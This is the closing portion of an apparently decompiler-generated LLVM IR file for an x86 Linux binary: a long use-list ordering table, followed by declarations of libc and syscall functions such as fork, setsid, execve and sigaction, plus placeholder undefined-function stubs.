917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 2316, 2317, 2318, 2319, 2320, 2321, 2322, 2323 }
  uselistorder i32* @ebx, { 74, 164, 165, 312, 314, 317, 318, 319, 320, 321, 315, 313, 316, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 343, 1, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 356, 354, 355, 357, 358, 276, 277, 166, 167, 168, 359, 2, 360, 361, 362, 3, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 169, 170, 171, 172, 374, 375, 635, 636, 5, 419, 383, 381, 382, 384, 387, 385, 386, 388, 389, 390, 4, 391, 433, 434, 435, 436, 437, 438, 439, 6, 440, 7, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 392, 393, 394, 395, 8, 404, 9, 405, 406, 173, 174, 175, 176, 10, 177, 178, 179, 11, 180, 12, 181, 182, 183, 184, 185, 698, 699, 13, 700, 701, 704, 705, 186, 623, 624, 625, 637, 14, 638, 639, 292, 293, 640, 641, 100, 101, 102, 706, 707, 708, 709, 710, 711, 712, 87, 713, 642, 643, 644, 645, 646, 714, 715, 716, 32, 33, 729, 730, 731, 748, 749, 750, 751, 29, 15, 27, 732, 742, 746, 747, 717, 257, 258, 259, 260, 261, 262, 263, 264, 718, 719, 720, 721, 728, 149, 150, 265, 266, 267, 268, 269, 270, 271, 275, 88, 89, 90, 91, 92, 300, 301, 16, 0, 302, 471, 472, 94, 303, 304, 305, 93, 95, 473, 474, 475, 738, 739, 96, 97, 98, 99, 647, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 17, 662, 663, 648, 649, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 18, 114, 115, 116, 117, 118, 119, 120, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 30, 675, 676, 677, 678, 679, 19, 680, 681, 682, 683, 684, 685, 686, 687, 688, 736, 737, 272, 273, 274, 455, 456, 457, 458, 459, 460, 20, 461, 462, 463, 604, 605, 606, 607, 608, 752, 753, 754, 755, 756, 757, 758, 762, 763, 602, 603, 187, 188, 615, 616, 189, 190, 191, 192, 193, 194, 195, 407, 408, 409, 410, 411, 412, 413, 414, 396, 399, 400, 401, 402, 403, 397, 398, 121, 122, 123, 124, 415, 416, 417, 418, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 230, 231, 21, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 22, 245, 246, 247, 248, 249, 250, 70, 71, 72, 73, 225, 227, 226, 228, 229, 159, 160, 161, 162, 163, 722, 23, 723, 724, 725, 726, 31, 24, 28, 727, 764, 765, 766, 767, 768, 420, 421, 422, 423, 424, 425, 426, 25, 427, 26, 428, 429, 430, 431, 432, 251, 252, 253, 376, 377, 378, 379, 380, 702, 703, 306, 307, 734, 735, 125, 126, 609, 610, 621, 622, 127, 128, 129, 626, 627, 740, 741, 693, 694, 695, 759, 760, 761, 628, 629, 696, 697, 130, 131, 132, 133, 134, 135, 136, 137, 138, 597, 598, 630, 631, 632, 633, 634, 139, 140, 141, 733, 743, 744, 745, 142, 143, 144, 145, 146, 147, 148, 151, 152, 153, 154, 155, 156, 157, 158, 254, 255, 256, 288, 289, 290, 291, 294, 295, 296, 297, 298, 299, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 308, 309, 310, 311, 464, 465, 466, 467, 468, 469, 470, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 599, 600, 601, 611, 612, 613, 614, 617, 618, 619, 620, 689, 690, 691, 692 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
